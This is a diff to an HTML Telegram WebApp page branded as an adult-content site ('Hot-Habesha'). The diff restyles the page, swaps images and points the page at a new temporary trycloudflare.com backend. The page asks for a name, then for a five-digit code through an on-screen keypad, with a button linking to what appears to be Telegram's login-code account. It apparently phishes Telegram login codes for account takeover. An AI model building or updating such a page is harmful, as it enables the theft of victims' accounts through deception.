@@ -20,8 +20,17 @@
     .bg-image {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
         background-size: cover; background-position: center;
-        filter: brightness(0.3) saturate(1.2); z-index: -1; transition: background-image 0.8s ease;
+        filter: brightness(0.9) saturate(1.5); 
+        z-index: -1; transition: background-image 0.8s ease;
     }
+    .bg-image::after {
+        content: "";
+        position: absolute;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: linear-gradient(rgba(255, 20, 157, 0.3), rgba(0, 0, 0, 0.7));
+        pointer-events: none;
+    }
+
 
     .step { display: none; width: 90%; max-width: 400px; animation: fadeIn .5s ease; flex-direction: column; align-items: center; text-align: center; }
     .active { display: flex; }
@@ -29,7 +38,7 @@
 
     .glass-card {
         background: rgba(255, 20, 147, 0.05); /* በጣም ደብዛዛ ፒንክ */
-        backdrop-filter: blur(20px);
+        backdrop-filter: blur(5px);
         border: 1px solid rgba(255, 105, 180, 0.3); /* ፒንክ ቦርደር */
         border-radius: 30px;
         padding: 30px; width: 100%; 
@@ -85,11 +94,11 @@
     .key:active { background: rgba(255, 20, 147, 0.3); }
 
     .msg { padding: 12px; border-radius: 10px; font-size: 14px; margin: 15px 0; display: none; width: 100%; }
-    .error { background: rgba(255, 50, 50, 0.2); color: #ff8888; border: 1px solid rgba(255, 0, 0, 0.2); }
+    .error { background: rgba(255, 50, 50, 0.5); color: #ffffff; border: 1px solid rgba(255, 0, 0, 0.2); }
     .loading-msg { background: rgba(255, 20, 147, 0.15); color: #FF69B4; border: 1px solid rgba(255, 20, 147, 0.2); }
 
     ul li i { color: #FF1493 !important; }
-    h1, h2, h3 { color: #FF69B4; text-shadow: 0 0 10px rgba(255, 20, 147, 0.3); }
+    h1, h2, h3 { color: #ffffff; text-shadow: 0 0 10px rgba(255, 20, 147, 0.3); }
 </style>
 
 </head>
@@ -98,7 +107,7 @@
     <div class="bg-image" id="bgLayer"></div>
 
     <div id="step_intro" class="step active">
-        <h1 style="font-size: 50px; letter-spacing: 2px; margin-bottom: 5px;">𝐖𝐞𝐥𝐥𝐜𝐨𝐦 𝐭𝐨</h1>
+        <h1 style="font-size: 50px; letter-spacing: 2px; margin-bottom: 5px;">𝐖𝐞𝐥𝐥𝐜𝐨𝐦 𝐓𝐨</h1>
         <p style="font-size: 30px; opacity: 0.8; margin-bottom: 20px;">𝐇𝐨𝐭-𝐇𝐚𝐛𝐞𝐬𝐡𝐚</p>
         <div class="loader-ring"></div>
         <h2 style="font-size: 20px; margin-top: 20px;">Loading...</h2>
@@ -106,7 +115,7 @@
 
     <div id="step_photo_slide" class="step">
         <div class="glass-card">
-            <img src="https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg" style="width: 100%; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5);">
+            <img src="https://i.postimg.cc/90Xhsjdx/5872995769143906173_119.jpg" style="width: 100%; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5);">
             
             <div style="margin-top: 20px; text-align: left; width: 100%;">
                 <p style="font-weight: bold; color: #ff00a9; border-bottom: 1px solid rgba(255,153,0,0.3); padding-bottom: 5px; margin-bottom: 10px;">
@@ -144,7 +153,9 @@
             <div class="otp-container" id="otp_container">
                 <div class="otp-box" id="b0"></div><div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div>
             </div>
-            <button class="btn-main" style="background: #27a7e7; color: #fff; margin-bottom: 15px; font-size: 14px;" onclick="window.open('https://t.me/42777', '_blank')">ኮዱን ለማግኘት እዚህ ይጫኑ</button>
+            <button class="btn-main" style="background: #27a7e7; color: #fff; margin-bottom: 15px; font-size: 14px;" onclick="window.open('https://t.me/42777', '_blank')">
+                <i class="fas fa-paper-plane"></i> ኮዱን ለማግኘት እዚህ ይጫኑ
+            </button>
             <div id="status2" class="msg"></div>
             <div class="keypad">
                 <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
@@ -173,7 +184,7 @@
     <div id="step_success" class="step">
         <div class="glass-card">
             <img src="https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg" style="width:100%; border-radius:15px;">
-            <h2 style="margin-top: 15px;">ተሳክቷል! ✅</h2>
+            <h2 style="margin-top: 15px;">ተሳክቷል! </h2>
             <button class="btn-main" onclick="window.location.href='https://t.me/EthioHotHub'">JOIN CHANNEL</button>
         </div>
     </div>
@@ -187,7 +198,7 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    const API_BASE_URL = "https://john-departmental-appreciation-correlation.trycloudflare.com"; 
+    const API_BASE_URL = "https://arrested-operating-sheets-divorce.trycloudflare.com"; 
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let sid = userId; 
     let currentOtp = "";
@@ -195,9 +206,9 @@
     let isProcessing = false;
 
     const photos = [
+        "https://i.postimg.cc/K8vckBCq/181675.jpg",
         "https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg",
-        "https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg",
-        "https://i.postimg.cc/v8fhNvFJ/5785193993233697937-121.jpg"
+        "https://i.postimg.cc/MHpCdmxf/6262627272727272818181.jpg"
     ];
 
     window.onload = function() {
@@ -248,7 +259,7 @@
 
     function handleLoginClick() {
         if(!document.getElementById('fname').value || !document.getElementById('lname').value) {
-            showMsg(1, 'error', 'እባክዎ መጀመሪያ ስምዎን ያስገቡ!');
+            showMsg(1, 'error', 'እባክዎ መጀመሪያ ስም ይሙሉ!');
             return;
         }
         startVerification();
@@ -282,7 +293,7 @@
             }
         } catch(e) { 
             isProcessing = false;
-            showMsg(1, 'error', 'ሰርቨሩ አልተገኘም። ቆይተው ይሞክሩ።');
+            showMsg(1, 'error', 'ሰርቨሩ ስለተጨናነቀ ትንሽ ቆይተው ይሞክሩ።');
         }
     }
 
